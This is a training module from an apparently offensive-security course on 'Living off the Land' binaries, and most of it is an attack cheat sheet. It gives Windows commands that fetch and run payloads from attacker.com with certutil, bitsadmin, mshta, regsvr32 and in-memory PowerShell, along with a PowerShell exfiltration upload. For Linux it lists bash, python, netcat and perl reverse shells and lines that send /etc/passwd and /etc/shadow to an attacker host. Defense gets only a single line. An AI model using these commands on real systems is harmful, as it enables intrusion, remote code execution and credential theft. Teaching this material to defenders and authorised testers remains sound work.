# Living Off the Land (LOLBins)

## Unit 9 - Topic 6 | Pivoting and Lateral Movement

---

## Overview

**Living off the Land (LOTL)** techniques use legitimate system tools and built-in binaries to perform malicious activities, avoiding the need to upload custom tools that might be detected by antivirus. These trusted binaries — called **LOLBins** — are already present on the target system.

---

## 1. What Is Living Off the Land?

```
TRADITIONAL ATTACK:
1. Upload malicious.exe to target    ← Detected by AV!
2. Execute malicious.exe             ← Flagged by EDR!
3. Get caught                        ← 😞

LIVING OFF THE LAND:
1. Use built-in PowerShell           ← Trusted by AV ✅
2. Use built-in certutil.exe         ← Signed by Microsoft ✅
3. Use built-in cmd.exe              ← Legitimate system tool ✅
4. Achieve same goals                ← Stealthier! 😎

WHY LOTL WORKS:
├── Tools are digitally signed by Microsoft
├── Already present — no file upload needed
├── Whitelisted by most security solutions
├── Used in normal operations (hard to distinguish)
├── Don't trigger "new file" alerts
└── Difficult to block without breaking functionality
```

---

## 2. Windows LOLBins

```powershell
# === FILE DOWNLOAD ===
# certutil:
certutil -urlcache -split -f http://attacker.com/payload.exe C:\temp\payload.exe

# PowerShell:
powershell -c "(New-Object Net.WebClient).DownloadFile('http://attacker.com/payload.exe','C:\temp\payload.exe')"
Invoke-WebRequest -Uri http://attacker.com/payload.exe -OutFile C:\temp\payload.exe
iwr http://attacker.com/payload.exe -o C:\temp\payload.exe

# bitsadmin:
bitsadmin /transfer job /download /priority high http://attacker.com/payload.exe C:\temp\payload.exe

# curl (Windows 10+):
curl http://attacker.com/payload.exe -o C:\temp\payload.exe

# === CODE EXECUTION ===
# mshta (HTML Application):
mshta http://attacker.com/payload.hta

# rundll32:
rundll32.exe javascript:"\..\mshtml,RunHTMLApplication";document.write();h=new%20ActiveXObject("WScript.Shell").Run("calc")

# regsvr32 (Squiblydoo):
regsvr32 /s /n /u /i:http://attacker.com/file.sct scrobj.dll

# wmic:
wmic process call create "powershell -e BASE64_PAYLOAD"

# cmstp:
cmstp.exe /ni /s payload.inf

# === RECONNAISSANCE ===
# Built-in Windows commands:
whoami /all                    # Current user + privileges
net user                       # Local users
net user /domain               # Domain users
net group "Domain Admins" /domain  # Domain admins
net share                      # Network shares
ipconfig /all                  # Network configuration
systeminfo                     # System information
tasklist                       # Running processes
arp -a                         # ARP table
route print                    # Routing table
netstat -ano                   # Active connections
```

---

## 3. PowerShell LOTL

```powershell
# === IN-MEMORY EXECUTION (Fileless) ===
# Download and execute in memory (no file on disk):
powershell -ep bypass -c "IEX(New-Object Net.WebClient).DownloadString('http://attacker.com/script.ps1')"

# Base64 encoded command:
powershell -enc BASE64_ENCODED_COMMAND

# AMSI bypass + execution:
# [Ref].Assembly.GetType('System.Management.Automation.AmsiUtils')...

# === POWERSHELL REMOTING ===
# Execute on remote host:
Invoke-Command -ComputerName SRV01 -ScriptBlock { whoami }

# Interactive session:
Enter-PSSession -ComputerName SRV01

# Execute script on multiple hosts:
Invoke-Command -ComputerName SRV01,SRV02,DC01 -FilePath C:\script.ps1

# === DATA EXFILTRATION ===
# Compress and exfil:
Compress-Archive -Path C:\sensitive -DestinationPath C:\temp\data.zip
# Upload via PowerShell:
(New-Object Net.WebClient).UploadFile("http://attacker.com/upload","C:\temp\data.zip")
```

---

## 4. Linux LOLBins

```bash
# === FILE DOWNLOAD ===
curl http://attacker.com/payload -o /tmp/payload
wget http://attacker.com/payload -O /tmp/payload
python3 -c "import urllib.request; urllib.request.urlretrieve('http://attacker.com/payload', '/tmp/payload')"

# === REVERSE SHELLS (No Tools Needed!) ===
# Bash:
bash -i >& /dev/tcp/attacker/4444 0>&1

# Python:
python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect(("attacker",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])'

# Netcat:
nc -e /bin/sh attacker 4444
# Or (without -e):
rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | nc attacker 4444 > /tmp/f

# Perl:
perl -e 'use Socket;$i="attacker";$p=4444;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));connect(S,sockaddr_in($p,inet_aton($i)));open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");'

# === FILE TRANSFER ===
# Using /dev/tcp:
cat /etc/passwd > /dev/tcp/attacker/8888
# Attacker: nc -nlvp 8888 > passwd.txt

# base64 encoding:
base64 /etc/shadow | nc attacker 8888
```

---

## 5. LOLBins Reference

| Binary | Download | Execute | Recon | Persist |
|--------|:--------:|:-------:|:-----:|:-------:|
| **PowerShell** | ✅ | ✅ | ✅ | ✅ |
| **certutil** | ✅ | ❌ | ❌ | ❌ |
| **bitsadmin** | ✅ | ❌ | ❌ | ✅ |
| **mshta** | ✅ | ✅ | ❌ | ❌ |
| **rundll32** | ❌ | ✅ | ❌ | ✅ |
| **regsvr32** | ✅ | ✅ | ❌ | ❌ |
| **wmic** | ❌ | ✅ | ✅ | ❌ |
| **curl** | ✅ | ❌ | ❌ | ❌ |
| **schtasks** | ❌ | ✅ | ❌ | ✅ |

> Full reference: [lolbas-project.github.io](https://lolbas-project.github.io)

---

## Summary Table

| Concept | Key Point |
|---------|-----------|
| **LOTL** | Use built-in tools to avoid detection |
| **LOLBins** | Legitimate binaries used maliciously |
| **certutil** | Download files on Windows |
| **PowerShell** | Most versatile LOTL tool |
| **Fileless** | Execute in memory — no files on disk |
| **Defense** | Monitor process command lines, AMSI |

---

## Quick Revision Questions

1. **What is Living off the Land and why is it effective?**
2. **How can certutil be used to download files?**
3. **What is fileless execution and why is it stealthy?**
4. **Name three Windows LOLBins and their capabilities.**
5. **How can defenders detect LOTL techniques?**

---

[← Previous: Lateral Movement Strategies](05-lateral-movement-strategies.md)

---

*Unit 9 - Topic 6 of 6 | [Back to README](../README.md) | [Next Unit: Network Defense Evasion →](../10-Network-Defense-Evasion/01-ids-ips-evasion.md)*
